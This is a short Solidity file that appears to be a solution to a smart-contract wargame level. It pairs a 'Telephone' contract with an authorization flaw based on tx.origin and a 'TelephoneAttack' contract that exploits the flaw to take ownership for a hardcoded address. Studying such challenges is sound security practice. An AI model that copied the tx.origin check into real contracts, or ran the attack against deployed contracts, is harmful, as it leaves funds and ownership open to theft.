pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {
  function attack(address _victim) public {
    Telephone telephone = Telephone(_victim);
    telephone.changeOwner(0xe55c687b9b2f673cd280e9339a499d2a0bc11d9d);
  }
}
